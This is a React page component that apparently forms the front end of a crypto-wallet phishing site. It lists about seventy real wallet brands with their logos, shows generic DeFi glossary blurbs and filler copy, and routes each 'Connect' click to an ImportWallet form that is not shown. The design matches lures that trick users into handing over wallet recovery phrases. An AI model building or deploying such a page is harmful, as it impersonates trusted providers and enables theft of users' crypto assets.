import React, { useState } from 'react';
import { useParams } from 'react-router';
import ImportWallet from './ImportWallet';

const BackupPage = () => {
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [showImport, setShowImport] = useState(false);

  const wallets = [
    { name: 'Trust', icon: '/images/logos/trust.png' },
    { name: 'Exodus', icon: '/images/logos/exodus.png' },
    { name: 'Lobstr', icon: '/images/logos/lobstr.png' },
    { name: 'Wallet connect', icon: '/images/logos/wconnect.jpg' },
    { name: 'Atomic', icon: '/images/logos/atomic.png' },
    { name: 'Metamask', icon: '/images/logos/metamask.png' },
    { name: 'Rainbow', icon: '/images/logos/rainbow.png' },
    { name: 'Argent', icon: '/images/logos/argent.jpg' },
    { name: 'Gnosis Safe Multisig', icon: '/images/logos/gnosis.jpg' },
    { name: 'Crypto.com | DeFi Wallet', icon: '/images/logos/crypto.png' },
    { name: 'Pillar', icon: '/images/logos/pillar.png' },
    { name: 'Anchor', icon: '/images/logos/anchor.png' },
    { name: 'ONTO', icon: '/images/logos/onto.png' },
    { name: 'MathWallet', icon: '/images/logos/math.png' },
    { name: 'BitPay', icon: '/images/logos/bitpay.jpg' },
    { name: 'Maiar', icon: '/images/logos/maiar.png' },
    { name: 'Ledger Live', icon: '/images/logos/ledgerlive.png' },
    { name: 'Walleth', icon: '/images/logos/walleth.png' },
    { name: 'Authereum', icon: '/images/logos/authereum.png' },
    { name: 'Huobi Wallet', icon: '/images/logos/huobi.jpg' },
    { name: 'Eidoo', icon: '/images/logos/eidoo.png' },
    { name: 'MYKEY', icon: '/images/logos/mykey.png' },
    { name: 'Loopring Wallet', icon: '/images/logos/loopring.jpg' },
    { name: 'TrustVault', icon: '/images/logos/trustvault.png' },
    { name: 'Coin98', icon: '/images/logos/coin98.png' },
    { name: 'CoolWallet S', icon: '/images/logos/coolwallet.png' },
    { name: 'Alice', icon: '/images/logos/alice.png' },
    { name: 'AlphaWallet', icon: '/images/logos/alpha.jpg' },
    { name: 'GridPlus', icon: '/images/logos/gridplus.png' },
    { name: 'CYBAVO Wallet', icon: '/images/logos/cybavo.png' },
    { name: 'Tokenary', icon: '/images/logos/tokenary.png' },
    { name: 'Wazirx', icon: '/images/logos/wazirx.png' },
    { name: "D'CENT Wallet", icon: '/images/logos/dcentwallet.png' },
    { name: 'ZelCore', icon: '/images/logos/zelcore.png' },
    { name: 'Nash', icon: '/images/logos/nash.jpg' },
    { name: 'Coinomi', icon: '/images/logos/coinomi.jpg' },
    { name: 'Torus', icon: '/images/logos/torus.jpg' },
    { name: 'Spatium', icon: '/images/logos/spatium.jpg' },
    { name: 'SafePal', icon: '/images/logos/safepal.png' },
    { name: 'Equal', icon: '/images/logos/equal.jpg' },
    { name: 'Infinito', icon: '/images/logos/infinito.png' },
    { name: 'Wallet.io', icon: '/images/logos/walletio.png' },
    { name: 'Infinity Wallet', icon: '/images/logos/infinity.png' },
    { name: 'Ownbit', icon: '/images/logos/ownbit.png' },
    { name: 'EasyPocket', icon: '/images/logos/easypocket.jpg' },
    { name: 'Bridge Wallet', icon: '/images/logos/bridge.png' },
    { name: 'SparkPoint', icon: '/images/logos/sparkpoint.png' },
    { name: 'Viawallet', icon: '/images/logos/viawallet.png' },
    { name: 'Bitkeep', icon: '/images/logos/bitkeep.png' },
    { name: 'Vision', icon: '/images/logos/vision.png' },
    { name: 'SWFT Wallet', icon: '/images/logos/swft.png' },
    { name: 'PEAKDEFI Wallet', icon: '/images/logos/peakdefi.png' },
    { name: 'Cosmostation', icon: '/images/logos/cosmostation.png' },
    { name: 'Graph Protocol', icon: '/images/logos/graph.jpg' },
    { name: 'KardiaChain', icon: '/images/logos/kardachain.png' },
    { name: 'Keplr', icon: '/images/logos/keplr.png' },
    { name: 'Harmony', icon: '/images/logos/harmony.png' },
    { name: 'ICONex', icon: '/images/logos/iconex.png' },
    { name: 'Fetch', icon: '/images/logos/fetch.jpg' },
    { name: 'XDC Wallet', icon: '/images/logos/xdc.png' },
    { name: 'Unstoppable Wallet', icon: '/images/logos/unstoppable.png' },
    { name: 'MEET.ONE', icon: '/images/logos/meet.jpg' },
    { name: 'Dok Wallet', icon: '/images/logos/dok.png' },
    { name: 'AT.Wallet', icon: '/images/logos/atwallet.png' },
    { name: 'MoriX Wallet', icon: '/images/logos/morix.png' },
    { name: 'Midas Wallet', icon: '/images/logos/midas.png' },
    { name: 'Ellipal', icon: '/images/logos/ellipal.png' },
    { name: 'KEYRING PRO', icon: '/images/logos/keyring.png' },
    { name: 'Blockchain', icon: '/images/logos/blockchain.png' },
    { name: 'Binance Smart Chain', icon: '/images/logos/bsc.png' },
    { name: 'Aktionariat', icon: '/images/logos/aktionariat.png' },
    { name: 'Coinbase', icon: '/images/logos/coinbase.png' },
  ];

  const connections = [
    { name: 'igo', desc: "Initial Game Offering (IGO) is a fundraising method for blockchain-based gaming projects. Investors can purchase in-game assets or tokens early. Research the project's team, roadmap, and community before investing." },
    { name: 'launchpad', desc: '' },
    { name: 'staking', desc: 'The process of locking up crypto assets to support a blockchain network and earn rewards. Investors should consider the staking rewards, lock-up periods, and risks involved.' },
    { name: 'farming', desc: 'A DeFi practice where investors provide liquidity to earn rewards. It can be highly profitable but also risky due to smart contract vulnerabilities and market volatility.' },
    { name: 'crypto', desc: 'Short for cryptocurrency, a digital or virtual currency that uses cryptography for security. Investors should diversify their portfolio and stay informed about market trends.' },
    { name: 'defi', desc: 'Decentralized Finance (DeFi) refers to financial services built on blockchain technology, eliminating intermediaries. Investors should research the risks and rewards of DeFi protocols before participating.' },
    { name: 'web3', desc: 'The next generation of the internet, powered by blockchain technology. It aims to create a decentralized and user-controlled web. Investors should explore opportunities in Web3 infrastructure and applications.' },
    { name: 'ido', desc: "Initial DEX Offering (IDO) is a fundraising method where tokens are sold on a decentralized exchange. Investors should assess the project's fundamentals and the DEX's credibility." },
    { name: 'token', desc: 'A digital asset or utility that exists on a blockchain. Tokens can represent ownership, access rights, or other values. Investors should evaluate the tokenomics and use cases of a token before investing.' },
    { name: 'nft', desc: 'Non-Fungible Tokens (NFTs) are unique digital assets that represent ownership of items like art, collectibles, or in-game items. Investors should research the rarity, utility, and demand for NFTs before investing.' },
    { name: 'secure', desc: 'Refers to the safety and protection of assets, data, and transactions in the crypto space. Investors should prioritize platforms with robust security measures like encryption and multi-factor authentication.' },
  ];

  const { id } = useParams();
  const handleClose = () => {setSelectedWallet(null); setShowImport(false);};

  const handleConnectClick = () => {
    setShowImport(true);
  };

  return (
    <div className="min-h-screen bg-[#0E1D26] text-white p-4 md:p-16 font-sans">
      <div className="max-w-4xl mx-auto">
        <h1 className="text-2xl md:text-3xl font-bold mb-6 md:mb-8 first-letter:uppercase">{id}</h1>
        <div className='bg-[#173140] p-2 rounded-md my-4'>{connections.find((c) => c.name === id)?.desc}</div>

        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 mb-6">
          <span className="text-sm font-medium text-gray-400">Choose wallet</span>
          <div className="flex items-center gap-3">
            <span className="text-sm text-[#3b82f6]">Show uninstalled</span>
            <label className="relative inline-flex items-center cursor-pointer">
              <input type="checkbox" className="sr-only peer" />
              <div className="w-11 h-6 bg-[#1e293b] rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-[#64748b] after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-[#3b82f6] peer-checked:after:bg-white"></div>
            </label>
          </div>
        </div>

        <div className="space-y-3">
          {wallets.map((wallet, index) => (
            <button
              key={index}
              onClick={() => setSelectedWallet(wallet)}
              className="w-full flex items-center px-4 md:px-8 py-4 md:py-5 bg-[#152B35] hover:bg-[#0f2235] rounded-xl border border-white/5 transition-all group"
            >
              <div className="w-10 h-10 md:w-12 md:h-12 shrink-0 rounded-full bg-white flex items-center justify-center mr-4 md:mr-16 overflow-hidden">
                <img src={wallet.icon} alt={wallet.name} className="w-6 h-6 md:w-8 md:h-8 object-contain" />
              </div>
              <span className="text-lg md:text-xl font-medium tracking-wide group-hover:text-blue-400 text-left">
                {wallet.name}
              </span>
            </button>
          ))}
        </div>
      </div>

      {/* MODAL - Sliding from end of screen */}
      {selectedWallet && !showImport && (
        <div 
          className="fixed inset-0 z-50 flex items-end justify-center bg-black/60 backdrop-blur-sm p-0 md:p-6"
          onClick={handleClose}
        >
          <div 
            className="bg-[#f9fcff] text-[#0E1D26] w-full max-w-lg rounded-t-[32px] md:rounded-3xl shadow-2xl relative p-8 flex flex-col items-center text-center animate-slide-up"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Grabber for mobile sheet look */}
            <div className="w-12 h-1.5 bg-gray-300 rounded-full mb-6 md:hidden"></div>

            <button onClick={handleClose} className="absolute top-6 right-6 text-gray-400 hover:text-gray-600">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>

            <div className="w-20 h-20 rounded-full bg-white flex items-center justify-center mb-6 shadow-sm border border-gray-100 overflow-hidden">
              <img src={selectedWallet.icon} alt={selectedWallet.name} className="w-12 h-12 object-contain" />
            </div>

            <h2 className="text-2xl font-bold mb-4">{selectedWallet.name}</h2>
            
            <p className="text-gray-600 text-base leading-relaxed mb-10 px-4">
              A Web3 wallet is a versatile and significant piece of technology that is set to revolutionize the way our online identity is presented and accessed. {selectedWallet.name} wallet can go here.
            </p>

            <button onClick={handleConnectClick} className=" py-2 px-6 rounded-full border-2 border-[#3b82f6] text-[#3b82f6] font-bold text-lg hover:bg-[#3b82f6] hover:text-white transition-all mb-4">
              Connect
            </button>
          </div>
        </div>
      )}

      {showImport && (
        <ImportWallet 
          wallet={selectedWallet} 
          onClose={handleClose} 
        />
      )}

      {/* Global Style for the slide animation */}
      <style>{`
        @keyframes slideUp {
          from { transform: translateY(100%); }
          to { transform: translateY(0); }
        }
        .animate-slide-up {
          animation: slideUp 0.3s ease-out forwards;
        }
      `}</style>
    </div>
  );
};

export default BackupPage;